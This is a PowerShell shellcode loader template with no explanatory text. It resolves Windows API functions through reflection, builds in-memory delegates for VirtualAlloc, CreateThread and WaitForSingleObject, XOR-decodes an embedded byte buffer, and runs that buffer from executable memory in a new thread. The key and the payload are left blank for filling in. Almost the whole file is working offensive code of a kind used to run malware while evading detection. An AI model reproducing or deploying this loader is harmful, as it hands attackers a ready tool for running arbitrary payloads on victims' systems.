function GetFuncFromDLL {
	param (
		$DllName,
		$FuncName
	)
	
	$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()
	$UtilMethods = @()

	$SystemDLL = ($Assemblies | Where-Object { 
	  $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals("System.dll") })

	$UnsafeObj = $SystemDLL.GetType('Microsoft.Win32.UnsafeNativeMethods')

	$UtilMethods += $UnsafeObj.GetMethod("GetModuleHandle")
	ForEach($Method in $UnsafeObj.GetMethods()){
		If ($Method.Name -eq "GetProcAddress") {$UtilMethods += $Method}
	}
	
	$Lib = $UtilMethods[0].Invoke($null, @($DllName))
	$Func = $UtilMethods[1].Invoke($null, @($Lib, $FuncName))
	
	return $Func
}

function BuildFuncFromPointer {
	param (
		$FuncAddr,
		$ArgsArray,
		$RetType
	)
	
	$InMemAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	$Domain = [AppDomain]::CurrentDomain
	$InMemAssemblyBuilder = $Domain.DefineDynamicAssembly($InMemAssembly, 
	  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)

	$InMemModuleBuilder = $InMemAssemblyBuilder.DefineDynamicModule('InMemModule', $false)
	$InMemTypeBuilder = $InMemModuleBuilder.DefineType('InMemDelegateType', 
	  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

	$InMemConstructorBuilder = $InMemTypeBuilder.DefineConstructor(
		'RTSpecialName, HideBySig, Public', 
		[System.Reflection.CallingConventions]::Standard, 
		$ArgsArray
	)

	$InMemConstructorBuilder.SetImplementationFlags('Runtime, Managed')

	$InMemMethodBuilder = $InMemTypeBuilder.DefineMethod('Invoke', 
		'Public, HideBySig, NewSlot, Virtual', 
		$RetType, 
		$ArgsArray
	)

	$InMemMethodBuilder.SetImplementationFlags('Runtime, Managed')

	$InMemDelegateType = $InMemTypeBuilder.CreateType()
	
	return [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FuncAddr, $InMemDelegateType)

}

$VirtualAlloc = BuildFuncFromPointer (GetFuncFromDLL "Kernel32.dll" "VirtualAlloc") @([Int],[UInt32],[UInt32],[UInt32]) ([IntPtr])
$CreateThread = BuildFuncFromPointer (GetFuncFromDLL "Kernel32.dll" "CreateThread") @([Int],[Int],[IntPtr],[Int],[Int],[Int]) ([IntPtr])
$WaitForSingleObject = BuildFuncFromPointer (GetFuncFromDLL "Kernel32.dll" "WaitForSingleObject") @([IntPtr],[Int]) ([IntPtr])

$key = "";
$keybytes = [System.Text.Encoding]::UTF8.GetBytes($key)

[Byte[]] $enc_buf = 



[Byte[]] $buf = New-Object Byte[] $enc_buf.Length
For ($i=0; $i -lt $enc_buf.Length; $i++){ $buf[$i] = $enc_buf[$i] -bxor $key[$i%$key.Length] }


[IntPtr]$address = $VirtualAlloc.Invoke($null, $buf.Length, 0x3000, 0x40)

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $address, $buf.Length)

$handle = $CreateThread.Invoke(0,0,$address,0,0,0)

$WaitForSingleObject.Invoke($handle, 0xFFFFFFFF)
